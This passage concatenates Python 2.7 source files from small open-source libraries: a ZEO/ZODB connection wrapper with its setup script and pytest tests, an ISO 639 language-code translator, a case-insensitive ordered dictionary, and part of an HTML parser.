        self.server = server
        self.port = port

        super(ZEOWrapper, self).__init__(
            project_key=project_key,
            run_asyncore_thread=run_asyncore_thread,
        )

    def _get_db(self):
        """
        Open the connection to the database based on the configuration file.
        """
        return DB(
            ClientStorage.ClientStorage((self.server, self.port))
        )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from zeo_wrapper import ZEOWrapper
from zeo_conf_wrapper import ZEOConfWrapper
from zeo_wrapper_prototype import ZEOWrapperPrototype
from transaction_manager import transaction_manager
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import thread
import asyncore
from functools import wraps

import transaction
from ZODB.POSException import ConnectionStateError
from BTrees.OOBTree import OOBTree


# Variables ===================================================================
_ASYNCORE_RUNNING = False


# Functions & classes =========================================================
def _init_zeo():
    """
    Start asyncore thread.
    """
    if not _ASYNCORE_RUNNING:
        def _run_asyncore_loop():
            asyncore.loop()

        thread.start_new_thread(_run_asyncore_loop, ())

        global _ASYNCORE_RUNNING
        _ASYNCORE_RUNNING = True


def retry_and_reset(fn):
    """
    Decorator used to make sure, that operation on ZEO object will be retried,
    if there is ``ConnectionStateError`` exception.
    """
    @wraps(fn)
    def retry_and_reset_decorator(*args, **kwargs):
        obj = kwargs.get("self", None)

        if not obj:
            obj = args[0]

        try:
            return fn(*args, **kwargs)
        except ConnectionStateError:
            obj._on_close_callback()

        return fn(*args, **kwargs)

    return retry_and_reset_decorator


class ZEOWrapperPrototype(object):
    """
    ZEO wrapper prototype baseclass.

    Attributes:
        project_key (str): Project key, under which will this object access the
            ZEO structure.
        default_type (obj): Default data object used for root, if the root
            wasn't already created in ZEO.
    """
    def __init__(self, project_key=None, run_asyncore_thread=True):
        """
        Initialize the object.

        Args:
            conf_path (str): See :attr:`conf_path`.
            project_key (str, default None): See :attr:`project_key`. If not
                set, the root of the database is used (this may cause
                performace issues).
            run_asyncore_thread (bool, default True): Run external asyncore
                thread, which handles connections to database? Default True.
        """
        self.project_key = project_key
        self.default_type = OOBTree

        self._root = None  #: Reference to the root of the database.
        self._connection = None  #: Internal handler for the ZEO connection.

        if run_asyncore_thread:
            _init_zeo()

        self._open_connection()
        self._init_zeo_root()

    def _on_close_callback(self):
        """
        When the connection is closed, open it again and get new reference to
        ZEO root.
        """
        self._open_connection()
        self._init_zeo_root()

    def _get_db(self):
        """
        This should return the ZODB database object.
        """
        raise NotImplementedError("._get_db() is not implemented yet.")

    def _open_connection(self):
        """
        Open the connection to the database based on the configuration file.
        """
        if self._connection:
            try:
                self._connection.close()
            except Exception:
                pass

        db = self._get_db()
        self._connection = db.open()

        self._connection.onCloseCallback(self._on_close_callback)

    def _init_zeo_root(self, attempts=3):
        """
        Get and initialize the ZEO root object.

        Args:
            attempts (int, default 3): How many times to try, if the connection
                was lost.
        """
        try:
            db_root = self._connection.root()
        except ConnectionStateError:
            if attempts <= 0:
                raise

            self._open_connection()
            return self._init_zeo_root(attempts=attempts-1)

        # init the root, if it wasn't already declared
        if self.project_key and self.project_key not in db_root:
            with transaction.manager:
                db_root[self.project_key] = self.default_type()

        self._root = db_root[self.project_key] if self.project_key else db_root

    def sync(self):
        """
        Sync the connection.

        Warning:
            Don't use this method, if you are in the middle of transaction, or
            the transaction will be aborted.

        Note:
            You don't have to use this when you set :attr:`run_asyncore_thread`
            to ``True``.
        """
        self._connection.sync()

    @retry_and_reset
    def __getitem__(self, key):
        return self._root[key]

    @retry_and_reset
    def __setitem__(self, key, val):
        self._root[key] = val

    @retry_and_reset
    def __contains__(self, key):
        return key in self._root

    @retry_and_reset
    def __delitem__(self, key):
        del self._root[key]

    @retry_and_reset
    def __iter__(self):
        return self._root.iteritems()

    @retry_and_reset
    def iteritems(self):
        return self._root.iteritems()

    @retry_and_reset
    def keys(self):
        return self._root.keys()

    @retry_and_reset
    def iterkeys(self):
        return self._root.iterkeys()

    @retry_and_reset
    def values(self):
        return self._root.values()

    @retry_and_reset
    def itervalues(self):
        return self._root.itervalues()

    @retry_and_reset
    def get(self, key, alt):
        return self._root.get(key, alt)

    def pack(self):
        """
        Call .pack() on the database (transaction history cleanup).
        """
        return self._get_db().pack()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from ZODB import DB
from ZODB.config import storageFromFile

from zeo_wrapper_prototype import ZEOWrapperPrototype


# Functions & classes =========================================================
class ZEOConfWrapper(ZEOWrapperPrototype):
    """
    ZEO wrapper based on ZEO client XML configuration file.

    Attributes:
        conf_path (str): Path to the configuration file.
        project_key (str): Project key, under which will this object access the
            ZEO structure.
        default_type (obj): Default data object used for root, if the root
            wasn't already created in ZEO.
    """
    def __init__(self, conf_path, project_key=None, run_asyncore_thread=True):
        """
        Initialize the object.

        Args:
            conf_path (str): See :attr:`conf_path`.
            project_key (str, default None): See :attr:`project_key`. If not
                set, the root of the database is used (this may cause
                performace issues).
            run_asyncore_thread (bool, default True): Run external asyncore
                thread, which handles connections to database? Default True.
        """
        self.conf_path = conf_path

        super(ZEOConfWrapper, self).__init__(
            project_key=project_key,
            run_asyncore_thread=run_asyncore_thread,
        )

    def _get_db(self):
        """
        Open the connection to the database based on the configuration file.
        """
        if self._connection:
            try:
                self._connection.close()
            except Exception:
                pass

        return DB(storageFromFile(open(self.conf_path)))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from BTrees.OOBTree import OOBTree

import transaction
from ..zeo_conf_wrapper import ZEOConfWrapper


# Functions & classes =========================================================
class DatabaseHandler(object):
    """
    Define interfaces to the database, configuration and so on.

    Attributes:
        conf_path (str): Path to the ZEO client XML configuration.
        project_key (str): Project key, which is used to access ZEO.
        zeo (obj): :class:`.ZEOConfWrapper` database object.
    """
    def __init__(self, conf_path, project_key):
        self.conf_path = conf_path
        self.project_key = project_key

        self.zeo = None
        self._reload_zeo()

    def _reload_zeo(self):
        self.zeo = ZEOConfWrapper(
            conf_path=self.conf_path,
            project_key=self.project_key
        )

    def _get_key_or_create(self, key, obj_type=OOBTree):
        with transaction.manager:
            key_obj = self.zeo.get(key, None)

            if key_obj is None:
                key_obj = obj_type()
                self.zeo[key] = key_obj

            return key_obj
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from database_handler import DatabaseHandler
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from functools import wraps

import transaction


# Functions & classes =========================================================
def transaction_manager(fn):
    """
    Decorator which wraps whole function into ``with transaction.manager:``.
    """
    @wraps(fn)
    def transaction_manager_decorator(*args, **kwargs):
        with transaction.manager:
            return fn(*args, **kwargs)

    return transaction_manager_decorator
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup
from setuptools import find_packages


# Variables ===================================================================
changelog = open('CHANGELOG.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))


# Actual setup definition =====================================================
setup(
    name='zeo_connector',
    version=getVersion(changelog),
    description="Wrappers, which make working with ZEO little bit nicer.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/zeo_connector',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 4 - Beta",
        'Intended Audience :: Developers',

        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    zip_safe=False,
    include_package_data=True,
    install_requires=open("requirements.txt").read().splitlines(),

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest",
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

import transaction

from zeo_connector import ZEOWrapper
from zeo_connector import ZEOConfWrapper
from zeo_connector.examples import DatabaseHandler

from zeo_connector_defaults import generate_environment
from zeo_connector_defaults import cleanup_environment
from zeo_connector_defaults import tmp_context_name
from zeo_connector_defaults.environment_generator import ZEO_PORT


# Variables ===================================================================
PROJECT_KEY = "some_key"


# Setup =======================================================================
def setup_module(module):
    generate_environment()


def teardown_module(module):
    cleanup_environment()


# Fixtures ====================================================================
@pytest.fixture
def zeo_conf_wrapper():
    return ZEOConfWrapper(
        conf_path=tmp_context_name("zeo_client.conf"),
        project_key=PROJECT_KEY,
    )


@pytest.fixture
def zeo_wrapper():
    return ZEOWrapper(
        server="localhost",
        port=ZEO_PORT,
        project_key=PROJECT_KEY,
    )


@pytest.fixture
def database_handler():
    return DatabaseHandler(
        conf_path=tmp_context_name("zeo_client.conf"),
        project_key=PROJECT_KEY,
    )


# Tests =======================================================================
def test_zeo_conf_wrapper_storing_and_retreiving():
    first_wrapper = zeo_conf_wrapper()
    second_wrapper = zeo_conf_wrapper()

    with transaction.manager:
        first_wrapper["something"] = "hello"

    with transaction.manager:
        assert second_wrapper["something"] == "hello"


def test_zeo_conf_wrapper_storing(zeo_conf_wrapper):
    with transaction.manager:
        zeo_conf_wrapper["azgabash"] = "hello"


def test_zeo_conf_wrapper_retreiving(zeo_conf_wrapper):
    with transaction.manager:
        assert zeo_conf_wrapper["azgabash"] == "hello"


def test_zeo_wrapper_retreiving(zeo_wrapper):
    with transaction.manager:
        assert zeo_wrapper["azgabash"] == "hello"


def test_zeo_wrapper_storing(zeo_wrapper):
    with transaction.manager:
        zeo_wrapper["zeo"] = "hello ZEO"


def test_zeo_wrapper_retreiving_again(zeo_wrapper):
    with transaction.manager:
        assert zeo_wrapper["zeo"] == "hello ZEO"


def test_dict_methods(zeo_wrapper, zeo_conf_wrapper):
    with transaction.manager:
        zeo_wrapper["first"] = 1

    used = {
        "something": "hello",
        "azgabash": "hello",
        "zeo": "hello ZEO",
        "first": 1,
    }

    with transaction.manager:
        assert "first" in zeo_conf_wrapper
        assert zeo_conf_wrapper.get("first", None) == 1
        assert zeo_conf_wrapper.get("second", 2) == 2

        assert set(zeo_conf_wrapper.keys()) == set(used.keys())
        assert set(zeo_conf_wrapper.values()) == set(used.values())

        assert set(zeo_conf_wrapper.iterkeys()) == set(used.iterkeys())
        assert set(zeo_conf_wrapper.itervalues()) == set(used.itervalues())

        iterated = {
            key: val
            for key, val in zeo_conf_wrapper
        }

        assert iterated == used

    with transaction.manager:
        del zeo_conf_wrapper["first"]

    with transaction.manager:
        assert "first" not in zeo_wrapper


def test_root_access():
    root = ZEOConfWrapper(
        conf_path=tmp_context_name("zeo_client.conf"),
    )

    assert PROJECT_KEY in root
    assert list(root.keys()) == [PROJECT_KEY]


def test_database_handler(database_handler):
    with transaction.manager:
        assert database_handler.zeo["zeo"] == "hello ZEO"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Source:
#   https://cs.wikipedia.org/wiki/Seznam_k%C3%B3d%C5%AF_ISO_639-1
#
# Variables ===================================================================
iso_639_2_to_1 = {
    "aa": "aar",
    "ab": "abk",
    "ae": "ave",
    "af": "afr",
    "ak": "aka",
    "am": "amh",
    "an": "arg",
    "ar": "ara",
    "as": "asm",
    "av": "ava",
    "ay": "aym",
    "az": "aze",
    "ba": "bak",
    "be": "bel",
    "bg": "bul",
    "bh": "bih",
    "bi": "bis",
    "bm": "bam",
    "bn": "ben",
    "bo": "tib",
    "br": "bre",
    "bs": "bos",
    "ca": "cat",
    "ce": "che",
    "ch": "cha",
    "co": "cos",
    "cr": "cre",
    "cs": "cze",
    "cu": "chu",
    "cv": "chv",
    "cy": "wel",
    "da": "dan",
    "de": "ger",
    "dv": "div",
    "dz": "dzo",
    "ee": "ewe",
    "el": "gre",
    "en": "eng",
    "eo": "epo",
    "es": "spa",
    "et": "est",
    "eu": "baq",
    "fa": "per",
    "ff": "ful",
    "fi": "fin",
    "fj": "fij",
    "fo": "fao",
    "fr": "fre",
    "fy": "fry",
    "ga": "gle",
    "gd": "gla",
    "gl": "glg",
    "gn": "grn",
    "gu": "guj",
    "gv": "glv",
    "ha": "hau",
    "he": "heb",
    "hi": "hin",
    "ho": "hmo",
    "hr": "scr",
    "ht": "hat",
    "hu": "hun",
    "hy": "arm",
    "hz": "her",
    "ia": "ina",
    "id": "ind",
    "ie": "ile",
    "ig": "ibo",
    "ii": "iii",
    "ik": "ipk",
    "io": "ido",
    "is": "ice",
    "it": "ita",
    "iu": "iku",
    "ja": "jpn",
    "jv": "jav",
    "ka": "geo",
    "kg": "kon",
    "ki": "kik",
    "kj": "kua",
    "kk": "kaz",
    "kl": "kal",
    "km": "khm",
    "kn": "kan",
    "ko": "kor",
    "kr": "kau",
    "ks": "kas",
    "ku": "kur",
    "kv": "kom",
    "kw": "cor",
    "ky": "kir",
    "la": "lat",
    "lb": "ltz",
    "lg": "lug",
    "li": "lim",
    "ln": "lin",
    "lo": "lao",
    "lt": "lit",
    "lu": "lub",
    "lv": "lav",
    "mg": "mlg",
    "mh": "mah",
    "mi": "mao",
    "mk": "mac",
    "ml": "mal",
    "mn": "mon",
    "mo": "mol",
    "mr": "mar",
    "ms": "may",
    "mt": "mlt",
    "my": "bur",
    "na": "nau",
    "nb": "nob",
    "nd": "nde",
    "ne": "nep",
    "ng": "ndo",
    "nl": "dut",
    "nn": "nno",
    "no": "nor",
    "nr": "nbl",
    "nv": "nav",
    "ny": "nya",
    "oc": "oci",
    "oj": "oji",
    "om": "orm",
    "or": "ori",
    "os": "oss",
    "pa": "pan",
    "pi": "pli",
    "pl": "pol",
    "ps": "pus",
    "pt": "por",
    "qu": "que",
    "rm": "roh",
    "rn": "run",
    "ro": "rum",
    "ru": "rus",
    "rw": "kin",
    "sa": "san",
    "sc": "srd",
    "sd": "snd",
    "se": "sme",
    "sg": "sag",
    "si": "sin",
    "sk": "slo",
    "sl": "slv",
    "sm": "smo",
    "sn": "sna",
    "so": "som",
    "sq": "alb",
    "sr": "scc",
    "ss": "ssw",
    "st": "sot",
    "su": "sun",
    "sv": "swe",
    "sw": "swa",
    "ta": "tam",
    "te": "tel",
    "tg": "tgk",
    "th": "tha",
    "ti": "tir",
    "tk": "tuk",
    "tl": "tgl",
    "tn": "tsn",
    "to": "ton",
    "tr": "tur",
    "ts": "tso",
    "tt": "tat",
    "tw": "twi",
    "ty": "tah",
    "ug": "uig",
    "uk": "ukr",
    "ur": "urd",
    "uz": "uzb",
    "ve": "ven",
    "vi": "vie",
    "vo": "vol",
    "wa": "wln",
    "wo": "wol",
    "xh": "xho",
    "yi": "yid",
    "yo": "yor",
    "za": "zha",
    "zh": "chi",
    "zu": "zul",
}

iso_639_1_to_2 = {
    val: key
    for key, val in iso_639_2_to_1.items()
}


# Functions & classes =========================================================
def translate(code, alt=None):
    """
    Try to translate `code` to ISO 639-2 interpreting code as ISO 639-1. If it
    doesn't matches, try to translate it to ISO 639-1 interpreting the code
    as ISO 639-2. If it also fails, return `alt`.

    Note:
        - ISO 639-1 uses two character long codes like `cs`.
        - ISO 639-2 uses three character long codes like `cze`.

    Args:
        code (str): Code you wish to translate.
        alt (any, default None): Alternative value in case that the code was
        not translated.

    Returns:
        str: Translated code or `alt`.
    """
    code = code.lower()
    new_code = iso_639_1_to_2.get(code)

    if new_code:
        return new_code

    return iso_639_2_to_1.get(code, alt)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup


# Package definition ==========================================================
setup(
    name='iso_639_codes',
    version="0.0.1",
    description="ISO 639-1 ↔ ISO 639-2 code translation.",
    long_description=open('README.rst').read(),
    url='https://github.com/Bystroushaak/iso_639_codes',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 4 - Beta",
        'Intended Audience :: Developers',

        "Programming Language :: Python",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    py_modules=["iso_639_codes"],

    zip_safe=False,
    include_package_data=True,
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from collections import OrderedDict


# Functions & objects =========================================================
def _lower_if_str(item):
    """
    Try to convert item to lowercase, if it is string.

    Args:
        item (obj): Str, unicode or any other object.

    Returns:
        obj: ``item.lower()`` if `item` is ``str`` or ``unicode``, else just \
             `item` itself.
    """
    # python 2 / 3 shill
    try:
        string_type = basestring
    except NameError:
        string_type = str

    if isinstance(item, string_type):
        return item.lower()

    return item


class SpecialDict(OrderedDict):
    """
    This dictionary stores items case sensitive, but compare them case
    INsensitive.
    """
    def __init__(self, *args, **kwargs):
        # lower_key -> key mapping
        self._case = OrderedDict()
        self._super.__init__(*args, **kwargs)

    @property
    def _super(self):
        return super(SpecialDict, self)

    def __setitem__(self, key, value):
        lower_key = _lower_if_str(key)

        # remove the old key with (possibly) different case
        if lower_key in self._case:
            original_key = self._case[lower_key]
            self._super.__delitem__(original_key)

        self._case[lower_key] = key

        self._super.__setitem__(key, value)

    def __getitem__(self, key):
        lower_key = _lower_if_str(key)

        if lower_key not in self._case:
            raise KeyError(repr(key))

        return self._super.__getitem__(self._case[lower_key])

    def __delitem__(self, key):
        lower_key = _lower_if_str(key)
        key = self._case[lower_key]

        del self._case[lower_key]

        return self._super.__delitem__(key)

    def clear(self):
        self._case.clear()
        return self._super.clear()

    def get(self, k, d=None):
        lower_key = _lower_if_str(k)
        if lower_key not in self._case:
            return d

        return self._super.get(self._case[lower_key], d)

    def __contains__(self, key):
        lower_key = _lower_if_str(key)
        right_key = self._case.get(lower_key, None)

        return right_key and right_key in set(self.keys())

    def has_key(self, key):
        return key in self

    def __eq__(self, obj):
        if self is obj:
            return True

        if not hasattr(obj, "__getitem__"):
            return False

        keys = None
        if hasattr(obj, "keys"):
            keys = obj.keys()
        elif hasattr(obj, "iterkeys"):
            keys = list(obj.keys())
        else:
            keys = list(obj)

        if len(self.keys()) != len(keys):
            return False

        for key in keys:
            if not self.__contains__(key):
                return False

            if obj[key] != self.__getitem__(key):
                return False

        return True

    def __ne__(self, obj):
        return not self.__eq__(obj)

    # python 2 / 3 compatibility
    def _is_py2(self):
        return hasattr(self._super, "iteritems")

    def iteritems(self, *args, **kwargs):
        if self._is_py2():
            return self._super.iteritems(*args, **kwargs)

        return self.items()

    def iterkeys(self, *args, **kwargs):
        if self._is_py2():
            return self._super.iterkeys(*args, **kwargs)

        return self.keys()

    def itervalues(self, *args, **kwargs):
        if self._is_py2():
            return self._super.itervalues(*args, **kwargs)

        return self.values()

    def keys(self, *args, **kwargs):
        if not self._is_py2():
            return list(self._super.keys(*args, **kwargs))

        return self._super.keys(*args, **kwargs)

    def items(self, *args, **kwargs):
        if not self._is_py2():
            return list(self._super.items(*args, **kwargs))

        return self._super.items(*args, **kwargs)

    def values(self, *args, **kwargs):
        if not self._is_py2():
            return list(self._super.values(*args, **kwargs))

        return self._super.values(*args, **kwargs)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Imports =====================================================================
import gc

from . import specialdict
from . import htmlelement

from .htmlelement import HTMLElement
from .htmlelement import _rotate_buff


# Functions ===================================================================
class StateEnum(object):
    _cnt = (x for x in range(100))

    content = next(_cnt)
    tag = next(_cnt)
    parameter = next(_cnt)
    comment = next(_cnt)


def first(inp_data):
    """
    Return first element from `inp_data`, or raise StopIteration.

    Note:
        This function was created because it works for generators, lists,
        iterators, tuples and so on same way, which indexing doesn't.

        Also it have smaller cost than list(generator)[0], because it doesn't
        convert whole `inp_data` to list.

    Args:
        inp_data (iterable): Any iterable object.

    Raises:
        StopIteration: When the `inp_data` is blank.
    """
    return next(x for x in inp_data)


def _raw_split(itxt):
    """
    Parse HTML from text into array filled with tags end text.

    Source code is little bit unintutive, because it is state machine parser.

    For better understanding, look at http://bit.ly/1rXRcJj

    Example::

        >>> dhtmlparser._raw_split('<html><tag params="true"></html>')
        ['<html>', '<tag params="true">', '</html>']

    Args:
        itxt (str): Input HTML text, which will be parsed.

    Returns:
        list: List of strings (input splitted to tags and text).
    """
    echr = ""
    buff = ["", "", "", ""]
    content = ""
    array = []
    next_state = 0
    inside_tag = False
    escaped = False

    COMMENT_START = ["-", "!", "<"]
    COMMENT_END = ["-", "-"]

    gc.disable()

    for c in itxt:
        # content
        if next_state == StateEnum.content:
            if c == "<":
                if content:
                    array.append(content)

                content = c
                next_state = StateEnum.tag
                inside_tag = False

            else:
                content += c

        # html tag
        elif next_state == StateEnum.tag:
            if c == ">":
                array.append(content + c)
                content = ""
                next_state = StateEnum.content

            elif c == "'" or c == '"':
                echr = c
                content += c
                next_state = StateEnum.parameter

            elif c == "-" and buff[:3] == COMMENT_START:
                if content[:-3]:
                    array.append(content[:-3])

                content = content[-3:] + c
                next_state = StateEnum.comment

            else:
                if c == "<":   # jump back into tag instead of content
                    array.append(content)
                    inside_tag = True
                    content = ""

                content += c

        # quotes "" / ''
        elif next_state == StateEnum.parameter:
            if c == echr and not escaped:  # end of quotes
                next_state = StateEnum.tag

            # unescaped end of line - this is good for invalid HTML like
            # <a href=something">..., because it allows recovery
            if c == "\n" and not escaped and buff[0] == ">":
                next_state = StateEnum.content
                inside_tag = False

            content += c
            escaped = not escaped if c == "\\" else False

        # html comments
        elif next_state == StateEnum.comment:
            if c == ">" and buff[:2] == COMMENT_END:
                next_state = StateEnum.tag if inside_tag else StateEnum.content
                inside_tag = False

                array.append(content + c)
                content = ""
            else:
                content += c

        # rotate buffer
        buff = _rotate_buff(buff)
        buff[0] = c

    gc.enable()

    if content:
        array.append(content)

    return array


def _indexOfEndTag(istack):
    """
    Go through `istack` and search endtag. Element at first index is considered
    as opening tag.

    Args:
        istack (list): List of :class:`.HTMLElement` objects.

    Returns:
        int: Index of end tag or 0 if not found.
    """
    if len(istack) <= 0:
        return 0

    if not istack[0].isOpeningTag():
        return 0

    cnt = 0
    opener = istack[0]
    for index, el in enumerate(istack[1:]):
        if el.isOpeningTag() and \
           el.getTagName().lower() == opener.getTagName().lower():
            cnt += 1

        elif el.isEndTagTo(opener):
            if cnt == 0:
                return index + 1

            cnt -= 1

    return 0


def _parseDOM(istack):
    """
    Recursively go through element array and create DOM.

    Args:
        istack (list): List of :class:`.HTMLElement` objects.

    Returns:
        list: DOM tree as list.
    """
    ostack = []
    end_tag_index = 0

    def neither_nonpair_or_end_or_comment(el):
        return not (el.isNonPairTag() or el.isEndTag() or el.isComment())

    index = 0
    while index < len(istack):
        el = istack[index]

        # check if this is pair tag
        end_tag_index = _indexOfEndTag(istack[index:])

        if end_tag_index == 0 and neither_nonpair_or_end_or_comment(el):
            el.isNonPairTag(True)

        if end_tag_index == 0:
            if not el.isEndTag():
                ostack.append(el)
        else:
            el.childs = _parseDOM(istack[index + 1: end_tag_index + index])
            el.endtag = istack[end_tag_index + index]  # reference to endtag
            el.endtag.openertag = el

            ostack.append(el)
            ostack.append(el.endtag)

            index = end_tag_index + index

        index += 1

    return ostack


def parseString(txt, cip=True):
    """
    Parse string `txt` and return DOM tree consisting of single linked
    :class:`.HTMLElement`.

    Args:
        txt (str): HTML/XML string, which will be parsed to DOM.
        cip (bool, default True): Case Insensitive Parameters. Use special
            dictionary to store :attr:`.HTMLElement.params` as case
            insensitive.

    Returns:
        obj: Single conteiner HTML element with blank tag, which has whole DOM\
             in it's :attr:`.HTMLElement.childs` property. This element can be\
             queried using :meth:`.HTMLElement.find` functions.
    """
    if isinstance(txt, HTMLElement):
        return txt

    # remove UTF BOM (prettify fails if not)
    if len(txt) > 3 and txt[:3] == u"\xef\xbb\xbf":
        txt = txt[3:]

    if not cip:
        htmlelement.html_parser.SpecialDict = dict
    elif isinstance(htmlelement.html_parser.SpecialDict, dict):
        htmlelement.html_parser.SpecialDict = specialdict.SpecialDict

    container = HTMLElement()
    container.childs = _parseDOM([
        HTMLElement(x) for x in _raw_split(txt)
    ])

    return container


def makeDoubleLinked(dom, parent=None):
    """
    Standard output from `dhtmlparser` is single-linked tree. This will make it
    double-linked.

    Args:
        dom (obj): :class:`.HTMLElement` instance.
        parent (obj, default None): Don't use this, it is used in recursive
               call.
    """
    dom.parent = parent

    for child in dom.childs:
        child.parent = dom
        makeDoubleLinked(child, dom)


def removeTags(dom):
    """
    Remove all tags from `dom` and obtain plaintext representation.

    Args:
        dom (str, obj, array): str, HTMLElement instance or array of elements.

    Returns:
        str: Plain string without tags.
    """
    # python 2 / 3 shill
    try:
        string_type = basestring
    except NameError:
        string_type = str

    # initialize stack with proper value (based on dom parameter)
    element_stack = None
    if type(dom) in [list, tuple]:
        element_stack = dom
    elif isinstance(dom, HTMLElement):
        element_stack = dom.childs if dom.isTag() else [dom]
    elif isinstance(dom, string_type):
        element_stack = parseString(dom).childs
    else:
        element_stack = dom

    # remove all tags
    output = ""
    while element_stack:
        el = element_stack.pop(0)

        if not (el.isTag() or el.isComment() or not el.getTagName()):
            output += el.__str__()

        if el.childs:
            element_stack = el.childs + element_stack

    return output
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
HTMLElement class used in DOM representation.
"""
# Imports =====================================================================
from ..quoter import escape, unescape
from ..specialdict import SpecialDict

from .shared import NONPAIR_TAGS
from .shared import _rotate_buff
from .shared import _closeElements


# Functions & objects =========================================================
# helper functions
def _is_str(tag):
    try:
        return isinstance(tag, basestring)
    except NameError:
        return isinstance(tag, str)


def _is_dict(tag):
    return isinstance(tag, dict)


def _is_iterable(container):
    return type(container) in [list, tuple]


def _all_html_elements(container):
    if not container or not _is_iterable(container):
        return False

    return all(map(lambda x: isinstance(x, HTMLParser), container))


class HTMLParser(object):
    """
    This class is used to represent single linked DOM (see
    :func:`.makeDoubleLinked` for double linked).

    Attributes:
        childs (list): List of child nodes.
        params (dict): :class:`.SpecialDict` instance holding tag parameters.
        endtag (obj): Reference to the ending :class:`HTMLElement` or ``None``.
        openertag (obj): Reference to the openning :class:`HTMLElement` or
                         ``None``.
    """
    def __init__(self, tag="", second=None, third=None):
        self._element = None
        self._tagname = ""

        self._istag = False
        self._isendtag = False
        self._iscomment = False
        self._isnonpairtag = False
        self._container = False  # used by .wfind()

        self.childs = []
        self.params = SpecialDict()
        self.endtag = None
        self.openertag = None

        # blah, constructor overloading in python sux :P
        if _is_str(tag) and not any([second, third]):
            self._init_tag(tag)

        elif _is_str(tag) and _is_dict(second) and not third:
            self._init_tag_params(tag, second)

        elif _is_str(tag) and _is_dict(second) and _all_html_elements(third):
            # containers with childs are automatically considered as tags
            if tag.strip():
                if not tag.startswith("<"):
                    tag = "<" + tag
                if not tag.endswith(">"):
                    tag += ">"

            self._init_tag_params(tag, second)
            self.childs = _closeElements(third, self.__class__)
            self.endtag = self.__class__("</" + self.getTagName() + ">")

        elif _is_str(tag) and _all_html_elements(second):
            # containers with childs are automatically considered as tags
            if tag.strip():
                if not tag.startswith("<"):
                    tag = "<" + tag
                if not tag.endswith(">"):
                    tag += ">"

            self._init_tag(tag)
            self.childs = _closeElements(second, self.__class__)
            self.endtag = self.__class__("</" + self.getTagName() + ">")

        elif _all_html_elements(tag):
            self._init_tag("")
            self.childs = _closeElements(tag, self.__class__)

        else:
            raise Exception("Unknown type '%s'!" % type(tag))

    # =========================================================================
    # = Constructor overloading ===============================================
    # =========================================================================
    def _init_tag(self, tag):
        """
        True constructor, which really initializes the :class:`HTMLElement`.

        This is the function where all the preprocessing happens.

        Args:
            tag (str): HTML tag as string.
        """
        self._element = tag

        self._parseIsTag()
        self._parseIsComment()

        if not self._istag or self._iscomment:
            self._tagname = self._element
        else:
            self._parseTagName()

        if self._iscomment or not self._istag:
            return

        self._parseIsEndTag()
        self._parseIsNonPairTag()

        if self._istag and (not self._isendtag) or "=" in self._element:
            self._parseParams()

    def _init_tag_params(self, tag, params):
        """
        Alternative constructor used when the tag parameters are added to the
        HTMLElement (HTMLElement(tag, params)).

        This method just creates string and then pass it to the
        :meth:`_init_tag`.

        Args:
            tag (str): HTML tag as string.
            params (dict): HTML tag parameters as dictionary.
        """
        self._element = tag
        self.params = params
        self._parseTagName()
        self._istag = True
        self._isendtag = False
        self._isnonpairtag = False

        self._element = self.tagToString()

    # =========================================================================
    # = Parsers ===============================================================
    # =========================================================================
    def _parseIsTag(self):
        """
        Detect whether the element is HTML tag or not.

        Result is saved to the :attr:`_istag` property.
        """
        el = self._element
        self._istag = el and el[0] == "<" and el[-1] == ">"

    def _parseIsEndTag(self):
        """
        Detect whether the element is `endtag` or not.

        Result is saved to the :attr:`_isendtag` property.
        """
        self._isendtag = self._element.startswith("</")

    def _parseIsNonPairTag(self):
        """
        Detect whether the element is nonpair or not (ends with ``/>``).

        Result is saved to the :attr:`_isnonpairtag` property.
        """
        self._isnonpairtag = False

        if self._iscomment:
            return

        if self._element.startswith("<") and self._element.endswith("/>"):
            self._isnonpairtag = True

        # check listed nonpair tags
        if self._istag and self._tagname.lower() in NONPAIR_TAGS:
            self._isnonpairtag = True

    def _parseIsComment(self):
        """
        Detect whether the element is HTML comment or not.

        Result is saved to the :attr:`_iscomment` property.
        """
        self._iscomment = (
            self._element.startswith("<!--") and self._element.endswith("-->")
        )

    def _parseTagName(self):
        """
